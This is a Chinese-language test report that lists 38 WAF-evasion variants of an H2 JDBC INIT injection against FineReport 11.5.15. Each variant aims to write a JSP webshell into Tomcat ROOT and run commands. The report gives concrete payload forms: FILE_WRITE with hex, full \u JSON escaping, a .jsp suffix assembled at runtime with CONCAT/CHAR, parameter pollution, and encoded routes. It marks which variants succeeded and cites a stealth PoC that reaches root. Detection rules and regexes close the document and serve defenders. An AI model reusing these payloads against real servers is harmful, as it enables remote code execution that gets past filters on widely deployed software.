# WAF 规避形态实测矩阵（38 变体，全部对 11.5.15 靶场实弹验证）

判定标准：完成 上传→apply→`GET /<jsp>?c=echo+ok` 全链，触发 200 且 `waitFor=0`
（JSP 落地 + 编译 + 命令执行三件事都成立）记 **★通**；否则 ✗ 并注明死因。
分两层：**L1 基础层**（字符级混淆，规则厂商应已覆盖）与 **L2 高级层**（解码深度错位 /
运行期构造 / 传输层形态——针对"规则直接防死简单绕过"的场景）。
脚本：`variants.py`（A-D 组）、`variants2.py`（A/B 修正轮）、`variants3.py`/`variants4.py`（X 系）。

---

## L2 高级层（X 系）—— 规则防不住的结构性绕过

### 核心武器 1：JSON `\uXXXX` 全转义（解码深度错位）★

`props` 是 JSON 字符串。**WAF 看到的是 query 里的 URL 编码字节，规则引擎通常只做 URL
解码，不做 JSON 字符串反转义；而 FR 的 JSON 解析器会。** 把 name 值整条以
`\u003b\u0049\u004e...` 形式投放：

```
{"name": "\u0078\u003b\u0049\u004e\u0049\u0054\u003d\u0043\u0041\u004c\u004c\u0020\u0046\u0049\u004c\u0045...", ...}
```

- **X1 ★** 部分转义（只转 `; ' ( ) 空格 = /`）——请求里 `INIT`、`CALL`、hex、路径全部消失
- **X2 ★** 全转义——HTTP 层**零** SQL/hex/路径/后缀特征，JSON 解析后才重组为完整载荷
- 引擎日志实证：落盘的 zip 名是**解码后的明文载荷**（`\u` 未被 FR 参数过滤器触碰，
  与旧结论"剥反斜杠"不同——该剥离只影响 `\;` 类形态）

### 核心武器 2：CONCAT/CHAR 运行期拼后缀（`.jsp` 明文消失）★

FILE_WRITE 的路径参数在 **H2 内部**求值，因此文件后缀可以运行期拼出：

```
concat('/usr/local/tomcat/webapps/ROOT/z', char(46),char(106),char(115),char(112))
→ /usr/local/tomcat/webapps/ROOT/z.jsp
```

- **X3' ★**（注意：`CHAR()` 在 H2 只收单参，多参是 MySQL 方言，首版死于此；
  VARCHAR 间 `||` 亦勿用——MODE=MYSQL 语义不同；binary `X'..'||X'..' 实测可用）
- **X4' ★** 叠加小写+注释

### 传输层形态

- **X5 ★** apply 参数挪 POST form body（规则常只盯 query string）
- **X6 ★** 绝对 URI 请求行（absolute-form：`POST http://host/path HTTP/1.1`）
- **X9 ★** 路由段百分号编码：`/webroot/decision/v%69ew/duchamp/reuse/%69tem`
  （Tomcat 解码后再做 servlet 映射，映射结果不变）

### 终极叠加（全维度同时上）★

- **X11 ★** = `\u` 全转义 + hex 切 8 块 + CONCAT/CHAR 拼后缀 + 小写 + 注释
- **X12 ★** = X11 + 编码路由 + body-apply + 绝对 URI 请求行

X12 的 WAF 视角：请求行 absolute-form 且路由带百分号编码；query 解码后只有
`\u00xx` 序列（无任何明文载荷）；apply 参数在 body；`.jsp` 后缀由数据库内 CHAR()
拼出——**每个常见签名维度都被消除，且各维度正交可自由组合**。
（`poc/poc.py --shape stealth` 即此形态，端到端实测 uid=0 回读。）

### 高级层死路（已证伪，附死因）

| 形态 | 死因 |
|---|---|
| X7 name 藏 ZIP 内 info.xml + props 无 name | 上传层报错 21300015——props.name 必填，服务器不回退读包内 name |
| X3 首版 `CHAR(46,106,115,112)` 多参 | H2 的 CHAR 只收单参数（MySQL 方言才多参），语法错 |
| X3 首版 VARCHAR 间 `\|\|` | MODE=MYSQL 下语义漂移，表达式求值错误 |

---

## L1 基础层（A/B/C/D 组）—— 字符级混淆

### A 组 SQL/INIT 载荷（10 通 5 死）

| ID | 形态 | 判定 |
|---|---|---|
| A1 | 基线 `x;INIT=CALL FILE_WRITE(X'H','P')--` | ★ |
| A2 | 全小写 | ★（H2 设置键与 SQL 大小写不敏感） |
| A3 | 随机大小写 | ★ |
| A4 | token 间注释 `CALL /*q*/ FILE_WRITE` | ★ |
| A16 | 函数名-括号间空格 | ★ |
| A17 | 参数内注释 | ★ |
| A8 | hex 两块拼接 `X'h1'\|\|X'h2'` | ★ |
| A9 | 路径 `./` 噪声 | ★ |
| A11 | 路径双斜杠 | ★ |
| A12 | 前置无害设置 `QUERY_TIMEOUT=0;` | ★ |
| A5 | `#` 注释吃尾 | ✗ H2 2.2 不支持 |
| A6 | 不闭合 `/*` 吃尾 | ✗ SQL 报错 |
| A7 | RAWTOCHAR 全 hex 路径 | ✗ 参数类型不匹配 |
| A10 | 路径 `../ROOT/` 回绕 | ✗ 上传层拒绝含 `..` 的 name |
| A13 | 设置键前导空格 | ✗ 键名不识别 |

### B 组 参数位置/污染（1 通 3 死）

| ID | 形态 | 判定 |
|---|---|---|
| B1 | 污染 `props=<payload>&props=<clean>` | ★（服务器取第一个；WAF 若取末值/合并即漏） |
| B2 | 反序 | ✗（服务器读第一个 clean——与 B1 合证取值语义） |
| B3 | props 入 multipart 字段 | ✗ FR 只读 query/form-urlencoded |
| B4 | 双重编码 `%3B` | ✗ 全链单层解码 |

### C 组 路由（3 通 1 死）

| ID | 形态 | 判定 |
|---|---|---|
| C2 | 尾斜杠 `/item/` | ★ |
| C3 | path-param `/item;a=b` | ★（Tomcat 剥路径参数后映射） |
| C5 | 段内双斜杠 | ★ |
| C4 | 大小写 `/Reuse/Item` | ✗ servlet 路由大小写敏感 |

### D 组 鉴权参数 tplPath（2 通 3 死）

| ID | 形态 | 判定 |
|---|---|---|
| D1 | `%72eportlets`（首字母编码） | ★ |
| D3 | `reportlets/`（尾斜杠） | ★ |
| D2 | `REPORTLETS` | ✗ 前缀比较大小写敏感，绕过失效 |
| D4 | `./reportlets` | ✗ |
| D5 | `reportlets/../reportlets` | ✗ |

---

## 给检测侧的建议（按本矩阵逐条封堵）

1. **必须做 JSON 深度解析后再检测**：对 `props` 类参数，URL 解码 → JSON parse → 取
   `name` 字段值再匹配（防 X1/X2 `\u` 转义）；未实现 JSON 反转义的规则在此面全部失明
2. **SQL 归一化**：去注释（`/*..*/`）、折叠空白、统一大小写后再匹配
   `\binit\s*=`（大小写不敏感）与 `X'[0-9A-Fa-f]{32,}'`；对函数名后接
   `concat(`, `char(`, `\|\|` 的字符串构造做求值还原（防 X3/X4/X8 后缀与路径拼装）
3. **路由归一化**：URL 解码（含 `%xx` 在路径中段）→ 剥 path-param（`;k=v`）→
   折叠多斜杠/尾斜杠 → 再做路由与 `tplPath=reportlets` 匹配（防 C2/C3/C5/X9/D1）
4. **参数取值语义**：重复参数取第一个（与服务器一致，防 B1）；同时检查 query 与
   urlencoded body（防 X5）
5. **传输层**：absolute-form 请求行的目标 URI 需归一化处理（防 X6）
6. **纵深（最可靠检出位）**：注入真正生效在 JDBC 层——对 FineReport
   `exampleDB test connection failed, path:jdbc:h2:` 日志做告警；
   JSP-Monitor 应覆盖全部 webapps 而非仅 webroot；应用进程降权运行
